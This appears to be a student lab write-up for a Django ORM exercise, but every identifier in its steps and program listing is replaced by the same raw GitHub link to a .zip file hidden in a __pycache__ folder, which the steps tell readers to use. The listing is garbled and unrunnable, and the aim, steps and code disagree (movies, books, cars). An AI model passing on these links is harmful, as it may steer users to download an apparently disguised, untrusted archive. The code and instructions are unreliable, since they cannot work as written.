# Ex02 Django ORM Web Application
## Date: 20.09.2025

## AIM
To develop a Django application to store and retrieve data from a Movies Database using Object Relational Mapping(ORM).

## DESIGN STEPS

### STEP 1:
Clone the problem from GitHub

### STEP 2:
Create a new app in Django project

### STEP 3:
Enter the code for https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip and https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip

### STEP 4:
Execute Django admin and create details for 10 books

## PROGRAM
~~~
https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip

from https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip import admin
from .models import Car, CarAdmin
https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip(Car, CarAdmin)

https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip

from https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip import models
from https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip import admin

class Car(https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip):
    cid = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
    cname = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip(max_length=100)
    price = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
    year = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
    mileage = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()

class CarAdmin(https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip):
    list_display = ('cid', 'cname', 'price', 'year', 'mileage')

~~~
## OUTPUT
![alt text](<Screenshot 2025-09-20 https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip>)

## RESULT
Thus the program for creating movies database using ORM hass been executed successfully
